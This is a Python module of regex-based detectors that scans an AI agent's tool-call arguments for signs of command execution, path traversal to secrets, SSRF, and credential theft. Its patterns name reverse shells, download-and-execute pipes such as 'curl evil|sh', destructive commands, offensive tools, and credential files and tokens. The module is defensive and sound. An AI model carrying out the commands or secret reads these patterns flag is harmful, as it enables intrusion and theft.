"""Infrastructure-abuse detectors.

The base trace analyser judges tool *authorisation*: was this tool allowed, was
approval given, did an argument leave its scope. That is enough for a support
agent. An agent with a shell, a filesystem, or network egress needs more,
because the danger is not only "was this tool allowed" but "what is this call
actually doing" — a permitted ``run_command`` tool is still a critical finding
if the command it was handed is ``curl evil|sh``.

So these detectors look *inside* the arguments of infra-capable tools for the
signatures of the techniques the offensive toolchain automates: command
execution, path traversal to secrets, SSRF and internal reach, and credential
theft. Each returns structured evidence — the matched indicator and why — so a
finding names the exact thing that tripped it and a human can confirm it fast.

These are detection heuristics over an agent's own action log. They do not run
anything. The signatures are conservative and favour surfacing a real technique
over staying quiet; an infra finding is meant to be reviewed, not shipped raw.
"""

from __future__ import annotations

import re
from dataclasses import dataclass

from ..models import Category, Severity


@dataclass(frozen=True)
class InfraHit:
    category: Category
    severity: Severity
    indicator: str      # a short label for what matched
    detail: str


# --- Command execution ------------------------------------------------------
# Shell metacharacters and chaining, download-and-execute, reverse shells.
_CMD_SIGNATURES = [
    (r"[;&|`]|\$\(", "shell metacharacter", Severity.HIGH),
    (r"\b(curl|wget)\b.{0,80}\|\s*(sh|bash)", "download-and-execute", Severity.CRITICAL),
    (r"\bnc\b.{0,40}-e|/dev/tcp/", "reverse shell", Severity.CRITICAL),
    (r"\b(rm|mkfs|dd)\b.{0,20}(-rf|/dev/)", "destructive command", Severity.CRITICAL),
    (r"\b(nmap|masscan|sqlmap|hydra|msfconsole|metasploit)\b",
     "offensive tool invocation", Severity.HIGH),
    (r"base64\s+-d|/bin/sh\s+-c|python\s+-c", "obfuscated execution", Severity.HIGH),
]

# --- File access ------------------------------------------------------------
_FILE_SIGNATURES = [
    (r"\.\./|\.\.\\", "path traversal", Severity.HIGH),
    (r"/etc/(shadow|passwd|sudoers)", "system credential file", Severity.CRITICAL),
    (r"(^|/)\.(ssh|aws|kube|docker)/", "user secret directory", Severity.CRITICAL),
    (r"id_(rsa|ed25519|ecdsa)|\.pem$|\.key$", "private key file", Severity.CRITICAL),
    (r"/proc/self/environ|/proc/\d+/environ", "process environment", Severity.HIGH),
    (r"\.env($|[^a-z])|credentials$|secrets?\.ya?ml", "secrets file", Severity.HIGH),
]

# --- Network pivot / SSRF ----------------------------------------------------
_NET_SIGNATURES = [
    (r"169\.254\.169\.254|metadata\.google\.internal|fd00:ec2::254",
     "cloud metadata endpoint", Severity.CRITICAL),
    (r"\b(127\.0\.0\.1|localhost|0\.0\.0\.0)\b", "loopback target", Severity.MEDIUM),
    (r"\b10\.(?:\d{1,3}\.){2}\d{1,3}\b|\b192\.168\.(?:\d{1,3})\.\d{1,3}\b"
     r"|\b172\.(?:1[6-9]|2\d|3[01])\.(?:\d{1,3})\.\d{1,3}\b",
     "private-range host", Severity.HIGH),
    (r"\bfile://|\bgopher://|\bdict://", "SSRF-prone URL scheme", Severity.HIGH),
    (r"-p\s*[\d,\-]+|\bportscan\b|--top-ports", "port scan parameters", Severity.HIGH),
]

# --- Credential access ------------------------------------------------------
_CRED_SIGNATURES = [
    (r"AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}", "AWS access key", Severity.CRITICAL),
    (r"\bghp_[0-9A-Za-z]{20,}|\bgithub_pat_", "GitHub token", Severity.CRITICAL),
    (r"-----BEGIN [A-Z ]*PRIVATE KEY-----", "private key material", Severity.CRITICAL),
    (r"\bBearer\s+[A-Za-z0-9._\-]{20,}", "bearer token", Severity.HIGH),
    (r"\b(aws_secret_access_key|api[_-]?key|client_secret)\b\s*[=:]",
     "credential assignment", Severity.HIGH),
]

_GROUPS = [
    (Category.COMMAND_EXECUTION, _CMD_SIGNATURES),
    (Category.FILE_ACCESS, _FILE_SIGNATURES),
    (Category.NETWORK_PIVOT, _NET_SIGNATURES),
    (Category.CREDENTIAL_ACCESS, _CRED_SIGNATURES),
]


def scan_text(text: str) -> list[InfraHit]:
    """Scan one string (a tool argument, or a response) for infra signatures."""
    if not text:
        return []
    order = [Severity.INFO, Severity.LOW, Severity.MEDIUM, Severity.HIGH, Severity.CRITICAL]
    hits: list[InfraHit] = []
    for category, sigs in _GROUPS:
        # Report the MOST SEVERE matching signature in this category, not the
        # first. `curl evil | sh` matches both "shell metacharacter" (high) and
        # "download-and-execute" (critical); taking the first would under-rate a
        # genuine RCE. Security detection fails safe by escalating, so among the
        # matches for a category we keep the worst.
        best: InfraHit | None = None
        for pattern, indicator, severity in sigs:
            m = re.search(pattern, text, re.I)
            if not m:
                continue
            hit = InfraHit(category=category, severity=severity, indicator=indicator,
                           detail=f"{indicator}: {m.group(0)[:60]!r}")
            if best is None or order.index(severity) > order.index(best.severity):
                best = hit
        if best is not None:
            hits.append(best)
    return hits


def scan_arguments(args: dict) -> list[InfraHit]:
    """Scan every argument value of a tool call."""
    hits: list[InfraHit] = []
    for value in args.values():
        hits.extend(scan_text(str(value)))
    return hits
